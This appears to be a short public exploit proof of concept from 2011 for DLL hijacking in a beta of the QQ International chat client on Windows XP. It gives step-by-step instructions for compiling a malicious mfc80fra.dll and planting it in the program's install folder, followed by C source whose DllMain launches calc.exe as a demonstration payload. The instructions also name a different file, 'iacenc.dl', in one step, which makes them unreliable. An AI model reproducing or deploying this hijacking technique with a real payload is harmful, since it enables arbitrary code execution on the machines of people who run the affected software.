# Exploit Title: QQ INTERNATIONAL v BÃªta 3 DLL Hijacking Exploit (mfc80fra.dll)
# Date: 18/03/2011
# Author: Metropolis
# Url: http://metropolis.fr.cr
# Software Link: http://www.toocharger.com/fiches/windows/qq-international/61560.htm
# Version: V1.2
# Tested on: Microsoft Windows XP Professional SP3 (FR)
# Information:
# http://en.wikipedia.org/wiki/Tencent_QQ
# Instructions:
# 1. Compile dll  
# gcc -shared -o mfc80fra.dll QQ.c
# 2. Add iacenc.dl
# C:\Program Files\Tencent\QQIntl\Bin
# 3. Launch QQ.exe
# 4. Calc DLL Hijacked! 
*/

#include <windows.h>
 
int pwnme()
{
  WinExec("calc", SW_NORMAL);
  exit(0);
  return 0;
}
 
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  pwnme();
  return 0;
}



